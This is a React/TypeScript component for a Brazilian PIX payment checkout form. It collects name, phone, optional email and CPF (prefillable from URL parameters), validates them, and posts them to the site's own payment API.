import { useState, useEffect } from "react";
import { User, Mail, Phone, CreditCard, Loader2, Shield } from "lucide-react";
import { toast } from "sonner";

interface PixPaymentData {
  transaction_id: string;
  pix_code: string;
  pix_qr_code: string;
  amount: string;
  status: string;
  expires_at: string;
}

interface IdentificationFormProps {
  productName: string;
  amountCents: number;
  onSubmit: (data: PixPaymentData) => void;
  onNameCapture?: (name: string) => void;
}

const IdentificationForm = ({
  productName,
  amountCents,
  onSubmit,
  onNameCapture,
}: IdentificationFormProps) => {
  const [email, setEmail] = useState("");
  const [noEmail, setNoEmail] = useState(false);
  const [phone, setPhone] = useState("");
  const [name, setName] = useState("");
  const [cpf, setCpf] = useState("");
  const [loading, setLoading] = useState(false);

  const formatCpf = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9)
      return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  };

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const urlName = params.get("name");
    const urlCpf = params.get("cpf");
    if (urlName) setName(decodeURIComponent(urlName));
    if (urlCpf) setCpf(formatCpf(decodeURIComponent(urlCpf)));
  }, []);

  const formatPhone = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 2) return `(${digits}`;
    if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const cleanPhone = phone.replace(/\D/g, "");
    const cleanCpf = cpf.replace(/\D/g, "");

    if (!name.trim()) {
      toast.error("Preencha o nome completo.");
      return;
    }

    if (cleanPhone.length !== 11) {
      toast.error("Preencha o telefone corretamente.");
      return;
    }

    if (cleanCpf.length !== 11) {
      toast.error("Preencha o CPF corretamente.");
      return;
    }

    if (!noEmail && !email.trim()) {
      toast.error("Preencha o e-mail ou marque 'Não tenho e-mail'.");
      return;
    }

    setLoading(true);
    onNameCapture?.(name.trim());
    try {
      const response = await fetch("/api/create-pix-payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: name.trim(),
          email: noEmail ? "" : email.trim(),
          cpf: cleanCpf,
          phone: cleanPhone,
          productName,
          amountCents,
        }),
      });

      const data = await response.json();

      if (!response.ok || !data?.success) {
        throw new Error(data?.error || "Erro ao gerar PIX");
      }

      onSubmit(data.data);
    } catch (err: any) {
      console.error("Payment error:", err);
      toast.error(err.message || "Erro ao gerar o PIX. Tente novamente.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-5 fade-in">
      {/* Identification */}
      <div className="bg-checkout-card border border-checkout-border rounded-2xl p-5 checkout-card-glow">
        <div className="flex items-center gap-2 mb-4">
          <User className="w-4 h-4 text-[#2957A4]" />
          <h2 className="text-checkout-text font-semibold text-sm">
            Identificação
          </h2>
        </div>

        <div className="space-y-3.5">
          {!noEmail && (
            <div>
              <label className="text-checkout-text-muted text-xs font-medium mb-1.5 block">
                E-mail
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-checkout-text-muted" />
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="email@email.com"
                  className="w-full bg-checkout-bg border border-checkout-border rounded-xl py-3 pl-10 pr-4 text-checkout-text text-sm placeholder:text-checkout-text-muted/50 focus:outline-none focus:border-checkout-success focus:ring-1 focus:ring-checkout-success/30 transition-all"
                />
              </div>
            </div>
          )}

          <label className="flex items-center gap-2 cursor-pointer">
            <input
              type="checkbox"
              checked={noEmail}
              onChange={(e) => setNoEmail(e.target.checked)}
              className="w-4 h-4 rounded border-checkout-border bg-checkout-bg accent-[#2957A4]"
            />
            <span className="text-checkout-text-muted text-xs">
              Não tenho e-mail
            </span>
          </label>

          <div>
            <label className="text-checkout-text-muted text-xs font-medium mb-1.5 block">
              Telefone
            </label>
            <div className="relative">
              <Phone className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-checkout-text-muted" />
              <input
                type="tel"
                value={phone}
                onChange={(e) => setPhone(formatPhone(e.target.value))}
                placeholder="(00) 00000-0000"
                className="w-full bg-checkout-bg border border-checkout-border rounded-xl py-3 pl-10 pr-4 text-checkout-text text-sm placeholder:text-checkout-text-muted/50 focus:outline-none focus:border-checkout-success focus:ring-1 focus:ring-checkout-success/30 transition-all"
              />
            </div>
          </div>

          <div>
            <label className="text-checkout-text-muted text-xs font-medium mb-1.5 block">
              Nome completo
            </label>
            <div className="relative">
              <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-checkout-text-muted" />
              <input
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="Nome e Sobrenome"
                className="w-full bg-checkout-bg border border-checkout-border rounded-xl py-3 pl-10 pr-4 text-checkout-text text-sm placeholder:text-checkout-text-muted/50 focus:outline-none focus:border-checkout-success focus:ring-1 focus:ring-checkout-success/30 transition-all"
              />
            </div>
          </div>

          <div>
            <label className="text-checkout-text-muted text-xs font-medium mb-1.5 block">
              CPF
            </label>
            <div className="relative">
              <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-checkout-text-muted" />
              <input
                type="text"
                value={cpf}
                onChange={(e) => setCpf(formatCpf(e.target.value))}
                placeholder="123.456.789-12"
                className="w-full bg-checkout-bg border border-checkout-border rounded-xl py-3 pl-10 pr-4 text-checkout-text text-sm placeholder:text-checkout-text-muted/50 focus:outline-none focus:border-checkout-success focus:ring-1 focus:ring-checkout-success/30 transition-all"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Payment */}
      <div className="bg-checkout-card border border-checkout-border rounded-2xl p-5 checkout-card-glow">
        <h2 className="text-checkout-text font-semibold text-sm mb-4">
          Pagamento
        </h2>

        <div className="bg-gray-50 border border-gray-200 rounded-xl p-6 flex flex-col items-center text-center">
          <img
            src="/pix-logo.png"
            alt="PIX - powered by Banco Central"
            className="h-10 object-contain mb-4"
          />
          <p className="text-checkout-text-muted text-xs leading-relaxed">
            Ao selecionar o Pix, você será encaminhado para um ambiente seguro
            para finalizar seu pagamento.
          </p>
        </div>
      </div>

      {/* Submit */}
      <button
        type="submit"
        disabled={loading}
        className="w-full bg-checkout-success hover:brightness-110 text-primary-foreground font-bold py-4 rounded-2xl text-base transition-all checkout-glow active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2"
      >
        {loading ? (
          <>
            <Loader2 className="w-5 h-5 animate-spin" />
            GERANDO PIX...
          </>
        ) : (
          "GERAR PIX"
        )}
      </button>

      <div className="flex flex-col items-center gap-2 mt-2">
        <p className="text-checkout-text-muted text-xs font-bold">
          Formas de pagamento
        </p>
        <img src="/pix-icon.png" alt="PIX" className="h-10 object-contain" />
        <p className="text-checkout-text-muted text-[10px]">
          © 2025 Formas de pagamento
        </p>
        <div className="flex items-center gap-1">
          <img
            src="/ambiente-seguro.png"
            alt="Ambiente seguro"
            className="h-5 object-contain"
          />
          <span className="text-checkout-text text-xs font-semibold">
            Ambiente seguro
          </span>
        </div>
      </div>
    </form>
  );
};

export default IdentificationForm;
